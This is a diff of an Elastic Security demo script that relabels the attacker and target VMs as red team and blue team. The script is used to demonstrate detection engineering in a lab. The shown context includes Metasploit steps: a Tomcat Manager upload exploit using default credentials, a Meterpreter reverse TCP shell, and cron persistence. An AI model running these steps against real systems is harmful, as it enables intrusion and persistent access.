@@ -1,19 +1,18 @@
-# Elastic Security Demo - Technical Execution Script
+# Elastic Security Demo 
 # Elastic 9.2 - Detection Engineering, Attack Chain, and Case Management
-# Author: Stuart, Elastic Security Sales Engineering
 # Last Updated: November 2025
 
 ################################################################################
 # PREREQUISITES
 ################################################################################
 
-# Target VM: Ubuntu 20.04 with Tomcat 9.0.30 (weak credentials: tomcat/tomcat)
-# Attacker VM: Ubuntu 22.04+ with Metasploit, Python 3, detection-rules repo
+# Blue Team VM: Ubuntu 20.04 with Tomcat 9.0.30 (weak credentials: tomcat/tomcat)
+# Red Team VM: Ubuntu 22.04+ with Metasploit, Python 3, detection-rules repo
 # Elastic: 9.2+ with Elastic Agent on target, configured Kibana connection
 
 # IPs for this demo:
-ATTACKER_IP="10.0.1.100"    # Replace with your attacker private IP
-TARGET_IP="10.0.1.50"        # Replace with your target private IP
+RED_TEAM_IP="10.0.1.100"    # Replace with your red team VM private IP
+BLUE_TEAM_IP="10.0.1.50"    # Replace with your blue team VM private IP
 
 ################################################################################
 # PHASE 1: DETECTION ENGINEERING
@@ -148,10 +147,10 @@ msfconsole -r ~/elastic_demo.rc
 
 # Resource script contains:
 # use exploit/multi/http/tomcat_mgr_upload
-# set RHOSTS TARGET_IP
+# set RHOSTS BLUE_TEAM_IP
 # set HttpUsername tomcat
 # set HttpPassword tomcat
-# set LHOST ATTACKER_IP
+# set LHOST RED_TEAM_IP
 # set payload java/meterpreter/reverse_tcp
 
 ## 3.2 - Verify configuration
@@ -162,9 +161,9 @@ exploit
 
 # Wait for session to open
 # Expected output:
-# [*] Started reverse TCP handler on ATTACKER_IP:4444
+# [*] Started reverse TCP handler on RED_TEAM_IP:4444
 # [*] Uploading payload...
-# [*] Sending stage to TARGET_IP
+# [*] Sending stage to BLUE_TEAM_IP
 # [*] Meterpreter session 1 opened
 
 ## 3.4 - Basic system information
@@ -203,7 +202,7 @@ background
 
 use exploit/linux/local/persistence_cron
 set SESSION 1
-set LHOST $ATTACKER_IP
+set LHOST $RED_TEAM_IP
 set LPORT 4445
 run
 
@@ -299,7 +298,7 @@ including initial access, persistence, and credential theft.
 # Click: "Observables" tab
 # 
 # NEW in 9.2: Observables auto-extracted from alerts:
-# - IP Addresses: 192.168.1.10 (target), 192.168.1.100 (attacker)
+# - IP Addresses: 192.168.1.10 (blue team), 192.168.1.100 (red team)
 # - Hostnames: ubuntu-tomcat-01
 # - Processes: java, bash, crontab, sudo
 # - File Paths: /opt/tomcat/webapps/shell.war, /etc/shadow, crontab paths
@@ -420,8 +419,8 @@ Status: Closed - Resolved
 sessions -K
 exit
 
-## Clean up target system (SSH to target)
-# ssh ubuntu@$TARGET_IP
+## Clean up blue team VM (SSH to blue team)
+# ssh ubuntu@$BLUE_TEAM_IP
 # sudo systemctl stop tomcat
 # sudo rm -rf /opt/tomcat/webapps/shell*
 # crontab -r
@@ -432,9 +431,9 @@ exit
 ################################################################################
 
 ## Test connectivity before demo
-ping $TARGET_IP
-curl http://$TARGET_IP:8080
-curl -u tomcat:tomcat http://$TARGET_IP:8080/manager/text/list
+ping $BLUE_TEAM_IP
+curl http://$BLUE_TEAM_IP:8080
+curl -u tomcat:tomcat http://$BLUE_TEAM_IP:8080/manager/text/list
 
 ## Verify Metasploit database
 sudo msfdb status
@@ -444,8 +443,8 @@ cd ~/detection-rules
 source .venv/bin/activate
 python -m detection_rules --help
 
-## Check Elastic Agent on target
-# ssh ubuntu@$TARGET_IP
+## Check Elastic Agent on blue team VM
+# ssh ubuntu@$BLUE_TEAM_IP
 # sudo systemctl status elastic-agent
 
 ################################################################################
@@ -464,10 +463,10 @@ source .venv/bin/activate
 python -m detection_rules kibana upload-rule rules/custom/tomcat_webshell_detection.toml
 
 ## If connectivity fails
-ping $TARGET_IP
-nc -zv $TARGET_IP 8080
+ping $BLUE_TEAM_IP
+nc -zv $BLUE_TEAM_IP 8080
 # Check security groups in AWS
-# Verify target Tomcat is running
+# Verify blue team Tomcat is running
 
 ################################################################################
 # DEMO SUMMARY
